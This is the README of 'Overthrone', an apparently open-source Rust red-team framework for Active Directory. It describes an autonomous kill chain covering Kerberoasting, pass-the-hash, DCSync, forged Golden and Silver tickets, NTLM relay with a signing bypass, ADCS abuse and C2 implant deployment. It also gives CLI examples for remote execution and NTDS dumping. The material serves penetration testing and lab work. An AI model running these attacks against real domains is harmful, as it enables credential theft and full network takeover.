<p align="center">
  <img src="assets/overthrone-banner.png" width="700" alt="overthrone banner" />
</p>

<h1 align="center">Overthrone</h1>

<p align="center">
  <b>Autonomous Active Directory Red Team Framework.</b><br/>
  Every throne falls. Overthrone makes sure of it.
</p>

<p align="center">
  <a href="https://github.com/Karmanya03/Overthrone/releases"><img src="https://img.shields.io/github/v/release/Karmanya03/Overthrone?style=flat-square&color=cc0000" alt="release" /></a>
  <a href="https://github.com/Karmanya03/Overthrone/blob/main/LICENSE"><img src="https://img.shields.io/badge/license-MIT-cc0000?style=flat-square" alt="license" /></a>
  <img src="https://img.shields.io/badge/written_in-Rust-cc0000?style=flat-square" alt="rust" />
  <img src="https://img.shields.io/badge/target-Active_Directory-cc0000?style=flat-square" alt="AD" />
</p>

<p align="center">
  <img src="https://img.shields.io/badge/enumeration-LDAP_SMB_Kerberos-blueviolet?style=flat-square" alt="protocols" />
  <img src="https://img.shields.io/badge/attack_graph-BloodHound_style-blueviolet?style=flat-square" alt="graph" />
  <img src="https://img.shields.io/badge/lateral_movement-PtH_%2B_PtT_%2B_Tickets-blueviolet?style=flat-square" alt="pth ptt" />
  <img src="https://img.shields.io/badge/persistence-Golden_%2F_Silver_%2F_Diamond-blueviolet?style=flat-square" alt="persistence" />
  <img src="https://img.shields.io/badge/reporting-Markdown_PDF_JSON-blueviolet?style=flat-square" alt="reports" />
  <img src="https://img.shields.io/badge/smb2-packet_signing-blueviolet?style=flat-square" alt="smb2 signing" />
  <img src="https://img.shields.io/badge/kerberos-SPNEGO_%2B_cross--domain-blueviolet?style=flat-square" alt="kerberos spnego" />
</p>

<p align="center">
  <img src="https://img.shields.io/badge/mimikatz-not_needed-ff4444?style=flat-square" alt="no mimikatz" />
  <img src="https://img.shields.io/badge/python-not_needed-ff4444?style=flat-square" alt="no python" />
  <img src="https://img.shields.io/badge/.NET-not_needed-ff4444?style=flat-square" alt="no dotnet" />
  <img src="https://img.shields.io/badge/wine-not_needed-ff4444?style=flat-square" alt="no wine" />
  <img src="https://img.shields.io/badge/impacket-not_needed-ff4444?style=flat-square" alt="no impacket" />
  <img src="https://img.shields.io/badge/binary-overthrone_or_ovt-00cc66?style=flat-square" alt="ovt shorthand" />
</p>

***

<p align="center">
  <a href="#what-is-this"><b>What is this</b></a> &nbsp;·&nbsp;
  <a href="#installation"><b>Install</b></a> &nbsp;·&nbsp;
  <a href="#wordlists"><b>Wordlists</b></a> &nbsp;·&nbsp;
  <a href="#commands"><b>Commands</b></a> &nbsp;·&nbsp;
  <a href="#usage"><b>Auto-Pwn Usage</b></a> &nbsp;·&nbsp;
  <a href="#architecture"><b>Architecture</b></a> &nbsp;·&nbsp;
  <a href="#features"><b>Features</b></a> &nbsp;·&nbsp;
  <a href="#examples"><b>Examples</b></a> &nbsp;·&nbsp;
  <a href="#faq"><b>FAQ</b></a>
</p>

***

## What is this?

You know how in medieval warfare, taking a castle required siege engineers, scouts, cavalry, archers, sappers, and someone to open the gate from inside? Active Directory pentesting is exactly that, except the castle is a Fortune 500 company, the gate is a misconfigured Group Policy, and the "someone inside" is a service account with `Password123!` that hasn't been rotated since Windows Server 2008 was considered modern.

Overthrone is a full-spectrum AD red team framework that handles the entire kill chain - from "I have network access and a dream" to "I own every domain in this forest and here's a 47-page PDF proving it." Built in Rust because C2 frameworks deserve memory safety too, and because debugging use-after-free bugs during an engagement is how you develop trust issues (both the Active Directory kind and the personal kind).

This is not a scanner. This is not a "run Mimikatz but in Rust" tool. This is not another Python wrapper that breaks when you look at it funny. This is the whole siege engine. One binary. Minimal runtime dependencies\*. All regret (for the blue team).

> **Shorthand:** Every command works with both `overthrone` and `ovt`. Because life is too short to type 10 characters when 3 will do. `ovt auto-pwn` = `overthrone auto-pwn`. Same war crimes against Active Directory, fewer keystrokes.

\*The binary is statically linked with ~35 Rust crates (Tokio, ldap3, kerberos\_asn1, etc.) - no Python, no .NET, no JVM. On Linux you need `smbclient` for some legacy SMB paths; most features use the built-in pure-Rust SMB2 client.

### The Kill Chain

```
  YOU                        OVERTHRONE                        DOMAIN CONTROLLER
   |                              |                                    |
    |   ovt auto-pwn                |                                    |
   |----------------------------->|                                    |
   |                              |                                    |
   |   Phase 1: RECON             |                                    |
   |   ├─ LDAP enumeration ------>|------ Who are you people? -------->|
   |   ├─ Users, groups, GPOs     |<----- Here's literally everything -|
   |   ├─ Kerberoastable SPNs     |       (AD has no chill)            |
   |   ├─ AS-REP roastable accts  |                                    |
   |   └─ Domain trusts           |                                    |
   |                              |                                    |
   |   Phase 2: GRAPH             |                                    |
   |   ├─ Build attack graph      |                                    |
   |   ├─ Find shortest path      |                                    |
   |   │   to Domain Admin        |                                    |
   |   └─ "Oh look, 3 hops.      |                                    |
   |       That's... concerning." |                                    |
   |                              |                                    |
   |   Phase 3: EXPLOIT           |                                    |
   |   ├─ Kerberoast that SPN --->|------ TGS-REQ for MSSQLSvc ------>|
   |   ├─ Crack offline           |<----- Here's a ticket, help urself |
   |   ├─ Pass-the-Hash --------->|------ SMB auth with NT hash ------>|
   |   └─ Lateral move            |       (the hash IS the password)   |
   |                              |                                    |
   |   Phase 4: PERSIST           |                                    |
   |   ├─ DCSync ---------------->|------ Replicate me everything ---->|
   |   ├─ Golden Ticket           |<----- krbtgt hash, as requested ---|
   |   └─ You own the forest.     |       (hope you enjoyed your reign)|
   |       The forest doesn't     |                                    |
   |       know yet.              |                                    |
   |                              |                                    |
   |   Phase 5: REPORT            |                                    |
   |   └─ PDF that makes the      |                                    |
   |      blue team question      |                                    |
   |      their career choices    |                                    |
   V                              V                                    V
```

## Architecture

Overthrone is a Rust workspace with 9 crates, because monoliths are for cathedrals, not offensive tooling. Each crate handles one phase of making sysadmins regret their GPO configurations:

```
overthrone/
├── crates/
│   ├── overthrone-core       # The brain - LDAP, Kerberos, SMB, NTLM, DRSR, MSSQL, ADCS, graph engine, crypto, C2, plugins, exec
│   ├── overthrone-reaper     # Enumeration - finds everything AD will confess (users, groups, ACLs, LAPS, GPP, ADCS)
│   ├── overthrone-hunter     # Exploitation - Kerberoast, ASREPRoast, coercion, delegation abuse, ticket manipulation
│   ├── overthrone-crawler    # Cross-domain - trust mapping, inter-realm tickets, SID filtering, foreign LDAP, MSSQL links
│   ├── overthrone-forge      # Persistence - Golden/Silver/Diamond tickets, DCSync, Shadow Creds, ACL backdoors, cleanup
│   ├── overthrone-pilot      # The autopilot - autonomous "hold my beer" mode with adaptive planning and wizard
│   ├── overthrone-relay      # NTLM relay - poisoning, responder, ADCS relay. The man-in-the-middle crate.
│   ├── overthrone-scribe     # Reporting - turns carnage into compliance documents (Markdown, PDF, JSON)
│   └── overthrone-cli        # The CLI + TUI + interactive REPL shell - where you type things and thrones fall
```

## The Crate Breakdown

Here's what's inside the box. Every module. Every protocol. Every hilarious amount of Rust the borrow checker screamed at us about. The table below is the **complete inventory** of what each crate actually does - no marketing fluff, no "coming soon" handwaving.

| Crate | Codename | What It Does | The Implementation |
|---|---|---|---|
| `overthrone-core` | The Absolute Unit | Protocol engine (LDAP, Kerberos, SMB, NTLM, MS-DRSR, MSSQL, DNS, Registry, PKINIT), attack graph with Dijkstra pathfinding, port scanner, full ADCS exploitation (ESC1-ESC13), crypto primitives (AES-CTS, RC4, HMAC, MD4, DPAPI, ticket crypto, GPP decryption), C2 integration (Sliver, Havoc, Cobalt Strike), plugin system (native DLL + WASM via wasmtime), remote execution (PsExec, SmbExec, WmiExec, WinRM, AtExec), interactive shell abstraction, secretsdump, RID cycling | The absolute unit that ate the gym. Every protocol is real - 56KB of Kerberos, 56KB of SMB, 43KB of LDAP, 50KB of secretsdump. The crypto has been battle-hardened with 66 passing tests. All 13 ADCS ESC vectors are implemented. 222 unit tests. Zero clippy warnings. The borrow checker needed therapy after this one. |
| `overthrone-reaper` | The Collector | AD enumeration - users, groups, computers, ACLs, delegations, GPOs, OUs, SPNs, trusts, LAPS (v1 plaintext + v2 encrypted via DPAPI), GPP password decryption, MSSQL instances, ADCS template enumeration, BloodHound JSON export, CSV export | BloodHound's data collection arc but without Neo4j eating 4GB of RAM for breakfast. LAPS v2 encrypted now actually decrypts thanks to the DPAPI module finally existing. The long-awaited reunion happened. There were tears. |
| `overthrone-hunter` | The Overachiever | Kerberoasting, AS-REP roasting, **zero-knowledge username enumeration via Kerberos AS-REQ**, auth coercion (PetitPotam, PrinterBug, DFSCoerce, ShadowCoerce, MS-EFSRPC), RBCD abuse, constrained/unconstrained delegation exploitation, ticket manipulation (.kirbi/.ccache conversion), inline hash cracking with embedded wordlist + rayon parallelism | The crate that did all its homework, extra credit, and the teacher's homework too. Zero stubs. Zero placeholders. Every attack works. This crate graduated top of its class and then helped the other crates pass their finals. |
| `overthrone-crawler` | The Explorer | Cross-domain trust mapping, inter-realm TGT forging, SID filter analysis, PAM trust detection, MSSQL linked server crawling, **foreign trust LDAP enumeration** (users, groups, computers, SPNs, ACLs across trust boundaries), cross-domain escalation planning | Used to have 5 functions that all returned empty with "LDAP not yet implemented." Now `foreign.rs` is 25KB of real cross-trust LDAP queries. The procrastination era is over. Welcome to the productivity arc. |
| `overthrone-forge` | The Blacksmith | Golden/Silver/Diamond ticket forging with full PAC construction, DCSync per-user extraction via MS-DRSR, Shadow Credentials (msDS-KeyCredentialLink + PKINIT auth), ACL backdoors via DACL modification, Skeleton Key orchestration via SMB/SVCCTL, DSRM backdoor via remote registry, forensic cleanup for all persistence mechanisms, ticket validation | Golden Tickets? Forged. Silver Tickets? Minted. Diamond Tickets? Polished. Shadow Credentials? Actually works now - PKINIT has real RSA signing and DH key exchange instead of "placeholder PEM structures." The chocolate key became a real key. |
| `overthrone-pilot` | The Strategist | Autonomous attack planning from graph data, step-by-step execution with rollback, adaptive strategy based on runtime results, **Q-Learning reinforcement learning engine** (compiled by default), goal-based planning ("get DA" → resolve path), YAML playbook engine, interactive wizard mode, full auto-pwn orchestration connecting enum → graph → exploit → persist → report, **live kill-chain pipeline visualization**, per-step Q-state/decision/reward readout, 9-section final report with credential tables and loot summaries | The "hold my beer" engine. Now with Q-Learning AI that learns which attacks work best against different environments, and actually tells you what it's doing instead of running in mysterious silence. Every step prints its stage, noise level, priority, and result. The Q-learner shows its state, which action it picked, whether it's exploring or exploiting, and the reward it got. The final report has a kill-chain completion visual, per-stage stats, credential tables, admin host lists, loot summaries, and a full audit trail. It plans, it adapts, it executes, it explains itself, it cleans up. If this crate were a person, it would be the one friend who handles your vacation AND writes a detailed trip report with expense breakdowns. |
| `overthrone-relay` | The Interceptor | NTLM relay engine (SMB→LDAP, HTTP→SMB, mix and match), LLMNR/NBT-NS/mDNS poisoner, network poisoner with stealth controls, ADCS-specific relay (ESC8) | Born complete. Zero stubs since day one. Responder.py walked so this crate could sprint. In Rust. Without the GIL. The overachiever sibling of overthrone-hunter. |
| `overthrone-scribe` | The Chronicler | Report generation - Markdown, JSON, PDF renderer. MITRE ATT&CK mapping, mitigation recommendations, attack narrative prose, session recording | Turns "I hacked everything" into "here's why you should pay us." All three formats work. Yes, including PDF now. The scribe and the CLI finally got couples therapy. |
| `overthrone-cli` | The Interface | CLI binary with Clap subcommands, interactive REPL shell with rustyline (command completion, history, context-aware prompts), TUI with ratatui (live attack graph visualization, session panels, logs, crawler integration), wizard mode, doctor command, auto-pwn, C2 implant deploy, PDF/Markdown/JSON report output, banner that took way too long to make | The interactive shell alone is 107KB. The commands implementation is 78KB. Everything is wired now - PDF reports, TUI crawler, C2 implant deployment. The banner ASCII art is *chef's kiss*. |

### The Crate Report Card

These are real numbers. Test counts pulled directly from source. No rounding up.

```
overthrone-core     ██████████████████████  ~99%  292 unit tests. ESC1-ESC13. SOCKS5 proxy (RFC 1928). Mask attack
                                                   cracker. Graph O(N²) fixed. Zero clippy warnings. The absolute unit
                                                   keeps getting bigger and hasn't broken yet. Suspicious.

overthrone-reaper   ██████████████████████  ~98%  65 unit tests. DPAPI decrypts LAPS v2 now. Full reaper_test.rs
                                                   integration suite (587 lines). Missing: a handful of edge-case GPO
                                                   attribute parsers that will never matter until they do.

overthrone-hunter   ██████████████████████  100%  11 unit tests. 100% feature complete. The overachiever.
                                                   hunter_test.rs integration suite (254 lines). No notes.

overthrone-crawler  █████████████████████░  ~95%  10 unit tests. foreign.rs went from empty to 25KB of real cross-trust
                                                   LDAP queries. crawler_test.rs integration suite (203 lines).
                                                   Missing: a few inter-realm SID filter edge cases. Close enough.

overthrone-forge    █████████████████████░  ~96%  17 unit tests. Shadow Creds PKINIT is real RSA+DH, not placeholder
                                                   PEM. forge_test.rs integration suite (130 lines). Diamond tickets
                                                   work. Golden/Silver/DCSync all solid.

overthrone-pilot    █████████████████████░  ~98%  8 unit tests + live DC integration suite (349 lines, gated behind
                                                   OT_DC_HOST). 3,078-line executor. 1,051-line Q-learner. Q-learning
                                                   compiles by default now - no more feature flag roulette. Live
                                                   kill-chain pipeline, per-step QL readout, 9-section final report.
                                                   The auto-pwn actually tells you what it's doing. Revolutionary.

overthrone-relay    ██████████████████████  100%  34 unit tests. relay.rs (1,557 lines), responder.rs (836 lines),
                                                   poisoner.rs (766 lines), ADCS relay (359 lines). Born complete.
                                                   Still complete. Annoyingly consistent.

overthrone-scribe   █████████████████████░  ~99%  12 unit tests. scribe_test.rs integration suite (314 lines). All
                                                   three output formats work and are wired to the CLI. PDF works.
                                                   We're as surprised as you are.

overthrone-cli      █████████████████████░  ~98%  3 unit tests (don't @ us, it's a CLI). 107KB interactive shell.
                                                   TUI wired. C2 deploy wired. PDF wired. All commands point to real
                                                   code. --help doesn't lie anymore.
```

## What's Still Cooking (The Backlog)

Every project has a backlog. Ours just got a whole lot smaller. Split into two honest tables: what's shipped, and what's genuinely still on the stove. No marketing spin. The shipped table is longer. We're proud.

### ✅ Shipped - Graduated from Backlog

The items below used to be `todo!()`. They are now real code. Some of them took longer than we'd like to admit. All of them work.

| What | Where | Notes |
|---|---|---|
| **SMB2 packet signing** | `core/src/proto/smb2.rs` | HMAC-SHA256 over every post-session-setup packet. `sign_required` negotiated from server SecurityMode. 9 call sites updated. The packets are wearing seatbelts now. |
| **Kerberos SPNEGO auth** | `core/src/proto/smb2.rs`, `kerberos.rs` | Proper AP-REQ wrapped in SPNEGO NegTokenInit. `connect_with_ticket()` on Linux no longer falls back to a broken NTLM hash. Real Kerberos or nothing. |
| **Cross-domain TGT referral** | `core/src/proto/kerberos.rs` | 2-hop referral loop in `request_tgt()`. Follows `KDC_ERR_WRONG_REALM` redirects to the right KDC via DNS SRV. Cross-forest attacks no longer require manual realm wrangling. |
| **WmiExec Linux guard** | `core/src/exec/wmiexec.rs` | `#[cfg(not(windows))]` returns a clear error instead of silently failing or panicking. `auto_exec()` skips WmiExec entirely on Linux. Use PsExec. It's fine. |
| **Clock skew check in `ovt doctor`** | `cli/src/commands/doctor.rs` | Anonymous LDAP bind to RootDSE, reads `currentTime`, diffs against local clock. Fails loud if drift > 5 min (Kerberos will reject you before you even start). |
| **ADCS ESC1 + ESC6** | `core/src/adcs/esc{1,6}.rs` | Full exploiters - SAN UPN abuse, CSR, enrollment, hash extraction, EDITF flag abuse. Iron Man has joined the MCU. |
| **LDAP signing bypass** | `relay/src/relay.rs` | CVE-2019-1040 "Drop the MIC" - strips SIGN/SEAL/ALWAYS_SIGN from CHALLENGE before victim sees it, zeroes MIC in AUTHENTICATE. Post-relay LDAP operations (add-to-group, search, modify) work on the relayed session. 7 new unit tests. The LDAP server said "please sign your messages" and we said "no." |
| **WASM plugin system** | `core/src/plugin/loader.rs` | State persistence, manifest section parsing, `allocate()` export support, `fn_free` fallback. Your WASM plugins have long-term memory now. They remember their first day at work. |
| **CLI PDF + C2 + TUI wiring** | `cli/src/commands_impl.rs`, `tui/runner.rs` | PDF reports, C2 implant deploy, TUI crawler - all actually call real code now. The three crates went to couples therapy. It worked. |
| **WinRM Windows output** | `core/src/exec/winrm/windows.rs` | `WSManReceiveShellOutput` loop collects real output. Schrödinger's remote execution has been resolved. The command ran AND we know what it said. |
| **Session resume + TOML config** | `cli/src/main.rs`, `pilot/src/runner.rs` | `--resume <file>` picks up mid-chain. `--config <file>` loads DC, domain, auth, stealth, jitter from TOML. No more repeating 14 flags every run. |
| **Credential Vault** | `core/src/lib.rs` (`CredStore`) | Thread-safe, privilege-ranked (DA > EA > Local Admin > Service > User), surfaced in the final auto-pwn report. Knows which creds are worth more than others. |
| **OPSEC Noise Gate** | `pilot/src/runner.rs` | `--stealth` caps the noise budget at `Medium`. High/Critical-noise steps are skipped and logged. The audit trail explains why it chickened out. |
| **JSON output + shell completions** | `cli/src/commands_impl.rs`, `main.rs` | `--output json` on `dump`/`rid`/`laps`/`gpp`/`scan`. `ovt completions <shell>` for bash, fish, zsh, powershell, elvish. Quality-of-life was underrated. |

### ❌ Still Pending

No sugarcoating. These are genuinely not done.

| What | Why It Matters | Status | Notes |
|---|---|---|---|
| **Live DC integration tests** | "It compiles" and "it works against a real DC" are two very different sentences. | ❌ Not yet | 292 unit tests pass. Property-based tests pass. Nobody has run this against GOAD or a real lab yet. That's the next milestone. The bravery check is scheduled. |
| **LDAP signing “Require” mode** | When the DC enforces `LdapServerIntegrity = 2`, the "Drop the MIC" technique isn’t enough - the server demands signed LDAP messages for every operation. | ⚠️ Partial | The bypass works when policy is "Negotiate" (common in many environments). When it’s "Require", we’d need the session key to sign messages - which we can’t derive in a relay scenario (we don’t know the victim’s NT hash). `ovt doctor` tells you which mode the DC is using. |
| **WmiExec on Linux/macOS** | WMI requires DCOM which requires Windows COM infrastructure. | ⚠️ Windows only | Use `--method psexec` or `--method smbexec` on Linux. They work everywhere. WmiExec is a Windows-only creature and it knows it. |

## Does It Actually Work?

Yes. Here's proof. One table. Every major feature. Every target OS you care about.

| Attack / Feature | WS 2019 | WS 2022 | WS 2025 | CTF / HTB / THM | What it does |
|---|:---:|:---:|:---:|:---:|---|
| **LDAP enumeration** | ✅ | ✅ | ✅ | ✅ | Real LDAP bind → search → parse. Pulls users, groups, SPNs, ACLs, trusts, GPOs, LAPS, GPP. The DC will tell you everything. It can't help itself. |
| **Kerberoast** | ✅ | ✅ | ✅ | ✅ | Real AS-REQ + TGS-REQ over TCP:88. Hashes drop into `./loot/` in correct `$krb5tgs$23$` hashcat format. Feed directly to hashcat, no cleanup needed. |
| **AS-REP roast** | ✅ | ✅ | ✅ | ✅ | AS-REQ without pre-auth, captures enc-part, outputs `$krb5asrep$23$`. Your GPU will enjoy this. |
| **Password spray** | ✅ | ✅ | ✅ | ✅ | Kerberos-based. Bails automatically after 3 `KDC_ERR_CLIENT_REVOKED` responses. Supports delay + jitter. Doesn't get you fired. Well, doesn't get *the accounts* locked. |
| **Pass-the-Hash** | ✅ | ✅ | ✅ | ✅ | `--nt-hash` on any SMB/exec command. NTLMv2 over SMB2. The hash is the password. `Password123!` becomes optional. |
| **SMB2 client** | ✅ | ✅ | ✅ | ✅ | 1669-line pure Rust SMB2 - negotiate, session setup, share enum, file read/write, admin check. No libsmbclient, no Python. |
| **Remote exec - PsExec** | ✅ | ✅ | ✅ | ✅ | Real `svcctl` named pipe. Creates → starts → reads → deletes the service. 543 lines of legit service control manager abuse. |
| **Remote exec - SmbExec** | ✅ | ✅ | ✅ | ✅ | Temp service + cmd.exe redirect → output via C$ share. Quieter than PsExec. |
| **Remote exec - WMI/WinRM** | ✅ | ✅ | ✅ | ✅ | WMI via DCOM over SMB (⚠️ Windows only - use PsExec/SmbExec on Linux). WinRM via WSMan HTTP/5985. `--method auto` tries them all until something works. |
| **DCSync** | ✅ | ✅ | ⚠️ | ✅ | MS-DRSR `DRSGetNCChanges` over named pipe. Asks the DC to replicate hashes. The DC complies. WS 2025 tightened some defaults - use `--stealth`. |
| **Golden Ticket** | ✅ | ✅ | ⚠️ | ✅ | Full PAC construction with `KERB_VALIDATION_INFO`, server + KDC checksums. Needs krbtgt hash. WS 2025 may need `FAST` armor depending on config. |
| **Silver Ticket** | ✅ | ✅ | ✅ | ✅ | Forge a TGS for any service. No DC contact at all. Quieter than Golden, harder to detect. |
| **Attack graph + path to DA** | ✅ | ✅ | ✅ | ✅ | Reverse Dijkstra from DA back to you. Shows the exact sequence of moves to go from zero to domain admin. Usually 3 hops. Always embarrassing for someone. |
| **ADCS ESC1-ESC8** | ✅ | ✅ | ⚠️ | ✅ | Core certificate abuse chain (SAN/EA/template/CA ACL/web relay). WS 2025 ships tighter defaults (EPA/strong mapping), so validate first with `ovt adcs enum`. |
| **ADCS ESC9-ESC13** | ✅ | ✅ | ⚠️ | ✅ | Advanced mapping/policy/CA key abuse paths are implemented (some are operator-guided depending on privileges and CA hardening). |
| **NTLM relay** | ✅ | ✅ | ⚠️ | ✅ | LLMNR/NBT-NS/mDNS poisoner + relay engine (SMB→LDAP, HTTP→SMB). Includes LDAP signing bypass via CVE-2019-1040 "Drop the MIC" technique - strips SIGN/SEAL flags from challenge + zeroes MIC in AUTHENTICATE. Works when DC LDAP signing policy is "Negotiate" (default on many configs). WS 2022+ with signing set to "Require" will still block relay. Run `ovt doctor` first. |
| **LAPS (v1 + v2)** | ✅ | ✅ | ✅ | ✅ | LAPS v1 reads `ms-Mcs-AdmPwd` in plaintext. LAPS v2 decrypts `msLAPS-EncryptedPassword` via DPAPI/AES-256-GCM. Both work. |
| **GPP decrypt** | ✅ | ✅ | ✅ | ✅ | Microsoft literally shipped the AES key in their documentation. We use it. `cpassword` → plaintext, every time. Thanks, Microsoft. |
| **RID cycling** | ✅ | ✅ | ✅ | ✅ | Enumerate users by RID even without valid creds (`--null-session`). Still works on misconfigured/legacy hosts. |
| **Hash cracking** | ✅ | ✅ | ✅ | ✅ | Offline cracking engine built in. Embedded 10K wordlist + mask attacks (`?u?l?l?d?d?d?d`) + hybrid mode + rayon parallelism. No hashcat required. |
| **SOCKS5 proxy / pivoting** | ✅ | ✅ | ✅ | ✅ | Full RFC 1928 SOCKS5 server on the compromised box. IPv4/IPv6/domain. Nothing extra needed on target. Pivot deeper into the network. |
| **Forge + C2 + ADCS + MSSQL** | ✅ | ✅ | ✅ | ✅ | Diamond tickets, Shadow Creds, Cobalt Strike/Sliver/Havoc integration, MSSQL `xp_cmdshell`, SCCM abuse. It's all in there. |
| **auto-pwn (full kill chain)** | ✅ | ✅ | ⚠️ | ✅ | Enum → graph → roast → crack → escalate → persist → report. One command. Live per-step output with Q-learning decisions. Ends with a kill-chain completion report, credential tables, and loot summary. Use `--stealth` on WS 2025 for the noisier phases. |

> ⚠️ = works, but some WS 2025 security defaults (EPA, SMB signing, PKINIT armor) may need a workaround. `ovt doctor` will tell you exactly what to do before you start.

~55,000 lines of Rust. Zero Python wrappers. Minimal shell-outs where strictly needed. 222 unit tests pass. 36+ tests covering graph + C2 + live DC infra. The code is real. The protocols are real. Go break some labs.

## Commands

30+ commands across recon, Kerberos, lateral movement, persistence, and more. Every command works as both `overthrone <cmd>` and `ovt <cmd>`.

> **[Full Command Reference →](COMMAND-LIST.md)** - detailed usage, flags, and examples for every command.

**Quick taste:**

```bash
ovt auto-pwn -H DC -d DOMAIN -u USER -p PASS           # Full AI killchain
ovt auto-pwn --config ./eng.toml --resume session.json  # Resume with config
ovt wizard   -t DA --dc-host DC -d DOMAIN -u USER      # Guided mode
ovt enum all -H DC -d DOMAIN -u USER -p PASS            # Enumerate everything
ovt kerberos user-enum -H DC -d DOMAIN --userlist users.txt   # Zero-knowledge user enum
ovt kerberos roast -H DC -d DOMAIN -u USER -p PASS      # Kerberoast
ovt exec -t TARGET -c "whoami" -d DOMAIN -u ADMIN       # Remote exec
ovt dump -t DC ntds -d DOMAIN -u DA -p PASS -o json     # Dump NTDS as JSON
ovt adcs enum -H DC -d DOMAIN -u USER -p PASS            # ADCS vuln scan
ovt doctor                                                # Health check
ovt completions bash                                      # Shell tab completion
```

---

## Features

### Enumeration (overthrone-reaper)

The "ask nicely and receive everything" phase. Active Directory is the most oversharing protocol since your aunt discovered Facebook.

| Feature | What it finds | Status |
|---|---|---|
| **Full LDAP enumeration** | Every user, computer, group, OU, and GPO in the domain. AD is surprisingly chatty with authenticated users. It's like a bartender who tells you everyone's secrets after one drink. | ✅ Done |
| **Kerberoastable accounts** | Service accounts with SPNs. These are the ones with passwords that haven't been changed since someone thought "qwerty123" was secure. | ✅ Done |
| **AS-REP roastable accounts** | Accounts that don't require pre-authentication. Someone literally unchecked a security checkbox. On purpose. In production. | ✅ Done |
| **Domain trusts** | Parent/child, cross-forest, bidirectional. The map of "who trusts whom" and more importantly, "who shouldn't." | ✅ Done |
| **ACL analysis** | GenericAll, WriteDACL, WriteOwner - the holy trinity of "this service account can do WHAT?" | ✅ Done |
| **Delegation discovery** | Unconstrained, constrained, resource-based. Delegation is AD's way of saying "I trust this computer to impersonate anyone." | ✅ Done |
| **Password policy** | Lockout thresholds, complexity requirements, history. Know the rules before you break them. | ✅ Done |
| **LAPS discovery** | LAPS v1 (plaintext ms-Mcs-AdmPwd) and LAPS v2 - including the encrypted variant (msLAPS-EncryptedPassword) via DPAPI/AES-256-GCM decryption. The DPAPI module finally exists. Hallelujah. | ✅ Full (v1 + v2 encrypted) |
| **GPP Passwords** | Fetches GPP XML from SYSVOL over SMB, decrypts cpassword values. Microsoft published the AES key. In their documentation. On purpose. | ✅ Done |
| **MSSQL Enumeration** | MSSQL instances, linked servers, xp_cmdshell. SQL Server: because every network needs a database with `sa:sa` credentials. | ✅ Full TDS client |
| **ADCS Enumeration** | Certificate templates, enrollment services, CA permissions, vulnerable template identification. ADCS is the gift that keeps on giving (to attackers). | ✅ Done |
| **BloodHound Export** | Export users, groups, computers, domains to BloodHound-compatible JSON. CSV and graph export too. | ✅ Done |

### Attack Execution (overthrone-hunter)

The crate with zero stubs. The only crate that did all its homework. If overthrone-hunter were a student, it would remind the teacher about the assignment.

| Attack | How it works | Status |
|---|---|---|
| **Kerberoasting** | Request TGS tickets for SPN accounts, crack offline with embedded wordlist or hashcat. The DC hands you encrypted tickets and says "good luck cracking these" and hashcat says "lol." | ✅ Full |
| **AS-REP Roasting** | Request AS-REP for accounts without pre-auth. Someone unchecked "Do not require Kerberos preauthentication." That single checkbox has caused more breaches than we can count. | ✅ Full |
| **Kerberos User Enumeration** | Zero-knowledge username discovery via AS-REQ probes. No credentials needed - the KDC error code reveals whether each account exists (`KDC_ERR_C_PRINCIPAL_UNKNOWN` = not found, `KDC_ERR_PREAUTH_REQUIRED` = valid). Automatically captures AS-REP hashes for any no-preauth accounts found during enumeration. Bring your own wordlist (SecLists, etc). | ✅ Full |
| **Auth Coercion** | PetitPotam, PrinterBug, DFSCoerce, ShadowCoerce - force machines to authenticate to you. The DC does this willingly. Microsoft considers this "working as intended." | ✅ Full (5 techniques) |
| **RBCD Abuse** | Create machine account + modify msDS-AllowedToActOnBehalfOfOtherIdentity + S4U2Self/S4U2Proxy chain. The attack with the longest name and the shortest time-to-DA. | ✅ Full |
| **Constrained Delegation** | S4U2Self + S4U2Proxy to impersonate users to specific services. Microsoft: "You can only impersonate to these services." Attackers: "What about these other services?" | ✅ Full |
| **Unconstrained Delegation** | Steal TGTs from anyone who authenticates to a compromised machine. It's always the print server. Always. | ✅ Full |
| **Inline Hash Cracking** | Embedded top-10K wordlist (zstd compressed), rayon parallel cracking, rule engine (leet, append year/digits, capitalize), hashcat subprocess fallback. | ✅ Full |
| **Ticket Manipulation** | Request, cache, convert between .kirbi and .ccache formats. Tickets are the currency of AD. This module is the money printer. | ✅ Full |

### Attack Graph (overthrone-core)

BloodHound rebuilt in Rust without the Neo4j dependency. Maps every relationship in the domain and finds the shortest path to making the blue team update their resumes.

| Feature | Details | Status |
|---|---|---|
| **Directed graph** | Nodes (users, computers, groups, domains) and edges (MemberOf, AdminTo, HasSession, GenericAll, etc.) - LinkedIn for attack paths. | ✅ Full (petgraph) |
| **Shortest path** | Dijkstra with weighted edges - `MemberOf` is free, `AdminTo` costs 1, `HasSpn` costs 5 (offline cracking). Finds the path of least resistance. Just like a real attacker. Just like water. | ✅ Full |
| **Path to DA** | Finds every shortest path from a compromised user to Domain Admins. Usually shorter than you'd expect. Usually terrifyingly short. | ✅ Full |
| **High-value targets** | Auto-identifies Domain Admins, Enterprise Admins, Schema Admins, KRBTGT, DC computer accounts. The "if you compromise these, the game is over" list. | ✅ Full |
| **Kerberoast reachability** | "From user X, which Kerberoastable accounts can I reach, and how?" - it's a shopping list for your GPU. | ✅ Full |
| **Delegation reachability** | "From user X, which unconstrained delegation machines are reachable?" (Spoiler: it's the print server.) | ✅ Full |
| **JSON export** | Full graph export for D3.js, Cytoscape, or your visualization tool of choice. Clients love graphs that look like conspiracy boards. | ✅ Full |
| **Degree centrality** | Find the nodes with the most connections. Either Domain Admins or the intern's test account that somehow has GenericAll on everything. | ✅ Full |

### NTLM Relay & Poisoning (overthrone-relay)

Born complete. Zero stubs. The prodigy crate that showed up on day one and said "I'm not here to play, I'm here to win."

| Feature | Details | Status |
|---|---|---|
| **NTLM Relay Engine** | Full relay - capture NTLM auth from one protocol, replay to another. SMB → LDAP, HTTP → SMB, mix and match like a deadly cocktail. | ✅ Full |
| **LDAP Signing Bypass** | CVE-2019-1040 "Drop the MIC" - strips SIGN/SEAL flags from the target's CHALLENGE before the victim sees it, zeroes MIC in AUTHENTICATE. Relayed sessions can perform LDAP operations (add-to-group, search, modify-replace). Works when DC signing policy is "Negotiate." | ✅ Full |
| **LLMNR/NBT-NS/mDNS Poisoner** | Respond to broadcast name resolution. "Who is FILESERVER?" "Me. I'm FILESERVER now." Identity theft, but for computers. | ✅ Full |
| **Network Poisoner** | Decides when to poison, what to poison, and how aggressively - while avoiding detection. Subtlety is an art form. | ✅ Full |
